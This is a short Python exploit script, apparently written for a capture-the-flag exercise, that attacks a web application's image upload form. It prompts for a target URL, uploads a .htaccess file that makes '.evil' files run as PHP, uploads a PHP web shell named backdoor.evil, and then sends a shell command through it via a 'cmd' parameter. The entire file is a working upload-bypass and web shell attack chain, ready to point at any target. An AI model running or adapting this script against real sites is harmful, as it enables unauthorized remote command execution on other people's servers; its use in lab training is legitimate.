import requests
import os

Upload_URL = input("Enter the target url: ")
Upload_Destination= input("Enter the URL where files are uploaded: ")

#Upload .htacess file with allowing .evil file to run as PHP
def htaccess_upload(url):
    
    if not os.path.exists(".htaccess"):
        print("[-] .htaccess file not found in current directory")
        return False
    
    htacess_file_upload = { # .htaccess file in directory where the script is executed
        "image": (".htaccess", open(".htaccess", "rb"), "text/plain") # "name = image" is used here in request, could be differnet in other applications.
        }
    r = requests.post(url, files=htacess_file_upload)

    print(r.status_code, r.text)


#Upload PHP web shell with .evil as the extenstion saved in directory where the script is executed
def upload_PHP_shell(url):
    PHP_upload = {
        "image": ('backdoor.evil' , open("backdoor.evil" , "rb") , 'application/x-httpd-php') 
    }

    r = requests.post(url , files=PHP_upload)
    print(r.status_code , r.text)


# The file is uploaded, I ran a test command 'ls -la' to test the shell, change the command to get the flag
def get_shell(url2):
    final_call = requests.get(url2 + "/backdoor.evil?cmd=ls -la")
    print(final_call.text)

htaccess_upload(Upload_URL)
upload_PHP_shell(Upload_URL)
get_shell(Upload_Destination)

